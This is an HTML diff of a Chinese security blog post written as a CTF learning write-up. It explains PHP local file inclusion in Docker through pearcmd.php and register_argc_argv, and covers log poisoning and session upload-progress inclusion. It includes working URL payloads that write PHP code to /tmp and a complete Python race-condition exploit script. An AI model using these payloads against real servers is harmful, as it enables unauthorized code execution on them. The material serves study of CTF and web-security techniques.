@@ -1,0 +1,1368 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="菜鸟随笔-PHP裸文件本地包含, Atmujie">
+    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>菜鸟随笔-PHP裸文件本地包含 | Atmujie</title>
+    <link rel="icon" type="image/png" href="/weblogo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Atmujie</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Atmujie</div>
+        <div class="logo-desc">
+            
+            有一美人兮，见之不忘，一日不见兮，思之如狂；
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">菜鸟随笔-PHP裸文件本地包含</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Web安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-11-02
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>菜鸟系列已经有段时间没有写了，因为自从GK之后，我从没像今天一样感觉自己菜的真实</p>
+<p>对这个知识点的思考起源于钱两天打的两场CTF,题目源码如下</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+@<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"dir"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^cool]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+                <span class="token punctuation">{</span>
+                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You are not cool!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data|fl|input|read/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;p> error! &lt;/p>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+                <span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">{</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这题我遇到了两次，也两次都不会做，直到昨天我看p牛发了新文章</p>
+<p><code>https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</code></p>
+<p>虽说我觉得预期解不一定是这样的</p>
+<p>大家有什么其他方法可以给我留言说一下</p>
+<h1 id="对PHP裸文件本地包含的理解"><a href="#对PHP裸文件本地包含的理解" class="headerlink" title="对PHP裸文件本地包含的理解"></a>对PHP裸文件本地包含的理解</h1><p>p牛在讲这片文章事前置了很多的知识，不过多数其实是对这个利用点的引出</p>
+<p>所以我这里先说结论</p>
+<h2 id="一、pearcmd-php"><a href="#一、pearcmd-php" class="headerlink" title="一、pearcmd.php"></a>一、pearcmd.php</h2><p>这个点主要是使用了pearcmd.php这个pecl/pear中的文件。</p>
+<p>PEAR  PHP扩展和应用程序存储库（PHP Extension and Application Repository）是可重用PHP组件的框架和分发系统。</p>
+<p>PECL（PHP扩展社区库）是PHP扩展的存储库，提供了所有已知扩展的目录和托管设施，用于下载和开发PHP扩展。</p>
+<p>++++</p>
+<p><img src="image-20211102152437786.png" alt="image-20211102152437786"></p>
+<p>+++</p>
+<p>关于这个点p牛也说得很清楚</p>
+<p>我主要关注后一段，docker任意版本都会默认安装，要知道现在的CTF几乎所有的Web题目都是搭建在docker中的，这意味着只要CTF存在文件包含，这一点就可以利用，堪称通杀</p>
+<h2 id="二、register-argc-argv配置"><a href="#二、register-argc-argv配置" class="headerlink" title="二、register_argc_argv配置"></a>二、register_argc_argv配置</h2><p>第二个点同样在docker中默认开启，当然真实环境中默认关闭</p>
+<blockquote>
+<p>docker</p>
+<p><img src="image-20211102153220763.png" alt="image-20211102153220763"></p>
+</blockquote>
+<blockquote>
+<p>真实环境，我这里是phpstudy,php7.3.4</p>
+<p><img src="image-20211102153157136.png" alt="image-20211102153157136"></p>
+</blockquote>
+<p><strong>当这个选项开启后，用户的query-string将赋值给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</strong></p>
+<p>这个部分我也并不是很懂，所以只能给出一个简单的结论：我们GET传入的值h会被当作一个命令行参数，比如</p>
+<pre class="line-numbers language-payload"><code class="language-payload">http://127.0.0.1/index.php?test
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里的test没有任意的意义，但会当作命令行参数</p>
+<p><img src="image-20211102214356468.png" alt="image-20211102214356468"></p>
+<p>将这两个点结合起来，所谓裸文件包含漏洞就产生了</p>
+<p>第一点中pear会获取命令行argv参数执行，第二点可以将可控参数写入argv</p>
+<p>为什么叫裸文件，因为docker下搭建的php默认开启了这两个配置，所以在出题人没有改的情况下，只需要有文件包含就可以利用</p>
+<p>+++</p>
+<p>pearcmd.php的所有命令</p>
+<p><img src="5b0b1d97-f739-4d67-b98b-82a6d889bd2c.png" alt="img"></p>
+<p>+++</p>
+<p>其中我们使用的是config-create命令</p>
+<p>这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
+<h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>文章开始的那道题，就是这个的漏洞的典型例子</p>
+<p><img src="image-20211102160000541.png" alt="image-20211102160000541"></p>
+<p>用这个漏洞，上面的waf就不用管了</p>
+<p>条件：存在file和dir，过正则</p>
+<pre class="line-numbers language-payload"><code class="language-payload">/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/aaa.php&dir=. 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211102212640566.png" alt="image-20211102212640566"></p>
+<p>这里要注意两个问题</p>
+<p>1、不能用hackbar直接上传payload而是需要先burp抓包再上传</p>
+<ul>
+<li><p>直接上传会导致&lt;&gt;被编码，php代码无法执行</p>
+<p>  <img src="image-20211102212832127.png" alt="image-20211102212832127"></p>
+</li>
+</ul>
+<p>2、访问时应该是<code>?file=/tmp/aaa.php%26dir%3D.&amp;dir=.</code></p>
+<ul>
+<li><p>在payload上传时，必须存在dir参数，但argv会将两个参数完整的保存下来，导致我们的文件名变成<code>/tmp/cmd1.php%00&amp;dir=.</code></p>
+<p>  <img src="image-20211102213112332.png" alt="image-20211102213112332"></p>
+<p>  所以访问时要先将dir=. 进行url编码，然后再去访问</p>
+</li>
+</ul>
+<p><img src="image-20211102213243288.png" alt="image-20211102213243288"></p>
+<p>如果觉得这样很麻烦或者无法理解，可以将payload改成如下形式</p>
+<pre class="line-numbers language-payload"><code class="language-payload">index.php?dir=.&+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/ffff.php
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样保存的文件名就是/tmp/ffff.php</p>
+<p><img src="image-20211102213705959.png" alt="image-20211102213705959"></p>
+<blockquote>
+<p>理解payload</p>
+<p>1、payload首先利用register的机制，将整个payload写入了argv</p>
+<p>2、file是题目代码中对文件包含的引用，也就是包含了/usr/local/lib/ogo/pearcmd.php这个文件</p>
+<p>执行顺序</p>
+<p>1、写入payload至argv</p>
+<p>2、包含pearcmd.php</p>
+<p>3、pearcmd.php读取argv</p>
+<p>此时dir=.无效，config-create被匹配为命令</p>
+<p>命令以空格为分割（加号）</p>
+<p>所以<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;</code>成为了第一个参数，/tmp/ffff.php为第二个参数</p>
+<p>phpinfo()被写入/tmp/fff.php</p>
+</blockquote>
+<h1 id="对前置引用知识点的理解"><a href="#对前置引用知识点的理解" class="headerlink" title="对前置引用知识点的理解"></a>对前置引用知识点的理解</h1><p>主菜我放前面啃完了，可按我的一贯原则，前缀既然提到了这些“副菜”,那我肯定不会放过</p>
+<p>所以现在来从头啃前置的知识点</p>
+<p>学习的过程其实很有趣，痛苦的永远是仔细学完后却用不出来，WEB这点到真不如开发</p>
+<p>学完就能用的感觉，真的就很快乐</p>
+<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>上面说了点废话，这里再说点</p>
+<p>虽然这篇文章是参考p牛，但我并不打算向p牛一样从前置一直写到最终目的。我会将所有的知识来拆开写</p>
+<p>言归正传</p>
+<p>日志包含参考文章：<code>https://blog.csdn.net/weixin_45785288/article/details/109730830</code></p>
+<p><strong>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</strong></p>
+<p>在docker中有所不同，docker会将日志重定向到stdout和stderr发送到真实设备</p>
+<p>所以docker一般无法通过日志包含getshell</p>
+<blockquote>
+<p>apache的日志文件会记录每次访问的响应信息和url请求数据</p>
+<p>用户对apache日志有访问权限</p>
+<p>这样就会产生日志包含漏洞</p>
+</blockquote>
+<p>我们可以直接写入不存在的请求，如</p>
+<pre class="line-numbers language-payload"><code class="language-payload">index.php/<?php phpinfo();?>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211103092918605.png" alt="image-20211103092918605"></p>
+<p>在有权限读取日志文件的情况下，可以文件包含</p>
+<p>日志文件目录格式</p>
+<pre class="line-numbers language-flie"><code class="language-flie">// web应用日志在Linux系统的格式基本统一
+/var/log/[Web应用服务名称]/access.log
+例如：
+/var/log/apache2/access.log
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="phpinfo有趣的使用方式"><a href="#phpinfo有趣的使用方式" class="headerlink" title="phpinfo有趣的使用方式"></a>phpinfo有趣的使用方式</h2><p>第二个点p牛讲的是关于临时文件包含和phpinfo的作用，但我觉得临时文件我们已经很熟悉了，这里直接写写phpinfo的利用方式</p>
+<p>在此之前，我对phpinfo的认识只停留在查看开启的服务，禁用的函数上</p>
+<p><strong>phpinfo页面中会输出本次请求的所有信息</strong></p>
+<p>如果上传文件，也会显示文件名，比如：</p>
+<p><img src="image-20211103142302619.png" alt="image-20211103142302619"></p>
+<p>得到了临时文件名</p>
+<p>在phpinfo页面做的操作都会在phpinfo中显示，相当于小型debug了</p>
+<h2 id="Windows通配符"><a href="#Windows通配符" class="headerlink" title="Windows通配符"></a>Windows通配符</h2><p>Linux系统的通配符在之前就学习过，windows的通配符还是第一次遇到，所以简单写一下</p>
+<p><strong>PHP在读取Windows文件时，会使用到<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw">FindFirstFileExW</a>这个Win32 API来查找文件，而这个API是支持使用通配符的</strong></p>
+<p>++++</p>
+<p><img src="image-20211103145727849.png" alt="image-20211103145727849"></p>
+<p>+++</p>
+<h2 id="session-upload-progress与Session文件包含"><a href="#session-upload-progress与Session文件包含" class="headerlink" title="session.upload_progress与Session文件包含"></a>session.upload_progress与Session文件包含</h2><p>PHP中可以通过session progress功能实现临时文件的写入。</p>
+<p>条件：</p>
+<ul>
+<li>目标环境开启了 session.upload_progress.enable 选项</li>
+<li>目标环境关闭了 session.upload_progress.cleanup 选项</li>
+<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li>
+<li>请求的Cookie中包含Session ID</li>
+</ul>
+<p>原理:</p>
+<blockquote>
+<p>当session.upload_progress.enable开启时，php会将用户上传的文件星系保存在Session中</p>
+<p>php中Session默认保存在文件里</p>
+<p>如果session.upload_progress.cleanup开启，那么php上传请求读取完成后Session会被自动情路，导致无法读取Session</p>
+</blockquote>
+<p><img src="image-20211103163257652.png" alt="image-20211103163257652"></p>
+<p>+++</p>
+<p>exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> wait
+
+target <span class="token operator">=</span> <span class="token string">'http://192.168.1.162:8080/index.php'</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> <span class="token string">'helloworld'</span>
+
+
+<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    files <span class="token operator">=</span> <span class="token punctuation">[</span>
+        <span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'load.png'</span><span class="token punctuation">,</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">40960</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> rf<span class="token triple-quoted-string string">'''&lt;?php file_put_contents('/tmp/success', '&lt;?=phpinfo()?>'); echo('{flag}'); ?>'''</span><span class="token punctuation">}</span>
+
+    <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
+            target<span class="token punctuation">,</span>
+            data<span class="token operator">=</span>data<span class="token punctuation">,</span>
+            files<span class="token operator">=</span>files<span class="token punctuation">,</span>
+            cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> flag<span class="token punctuation">}</span><span class="token punctuation">,</span>
+        <span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
+            f<span class="token string">'{target}?file=/tmp/sess_{flag}'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+            e<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    futures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    pool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>upload<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>write<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    wait<span class="token punctuation">(</span>futures<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>+++</p>
+<h2 id="异常退出php以保留临时文件"><a href="#异常退出php以保留临时文件" class="headerlink" title="异常退出php以保留临时文件"></a>异常退出php以保留临时文件</h2><p>如果仅仅是为了执行一次命令，比如CTF比赛，直接条件竞争临时文件没有问题，但如果想长久的将文件保存，有两种方法</p>
+<p>一、目前最常用的办法：在临时文件中执行shell将木马写入其他文件</p>
+<p>二、使php异常退出让存有木马的临时文件得以留存</p>
+<p>之所以需要方法二，是因为在无法快速得知临时文件名的情况下，不可能通过爆破的手段得到临时文件名，所以让临时文件保存下来慢慢爆破无疑是个好选择</p>
+<p>+++</p>
+<p><img src="image-20211103183322927.png" alt="image-20211103183322927"></p>
+<p>这个漏洞在7.1.20以后被修复</p>
+<p><img src="image-20211103183631152.png" alt="image-20211103183631152"></p>
+<p>+++</p>
+<p>怎么说呢，我是觉得我该好好的学学协议了，http,file,gopher还好说，php，data，就抓瞎，只会用不懂原理，我怕是早晚要凉</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://atmujie.github.io/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/">http://atmujie.github.io/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Atmujie</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Web安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+        <div class="disqus-card card" data-aos="fade-up">
+    <div id="disqus_thread" class="card-content">
+        <noscript>Please enable JavaScript to view the
+            <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+    </div>
+</div>
+
